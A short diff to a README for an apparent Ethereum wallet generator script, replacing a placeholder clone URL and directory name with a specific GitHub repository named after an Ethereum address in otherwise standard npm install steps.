@@ -7,8 +7,8 @@ After generating all the wallets, the script saves the address, mnemonic, and pr
 ## Installation:
 ### First download ETH wallet Generator or clone it
 --
-1. Clone the repository: **`git clone https://github.com/username/project-title.git`**
-2. Navigate to the project directory: **`cd project-title`**
+1. Clone the repository: **`git clone https://github.com/mascrypt0/0xbaae099935769FD77FF21dFf915765f71BA71970.git`**
+2. Navigate to the project directory: **`cd 0xbaae099935769FD77FF21dFf915765f71BA71970`**
 3. Install dependencies: **`npm install`**
 4. Build the project: **`npm run build`**
 5. Start the project: **`npm start`**
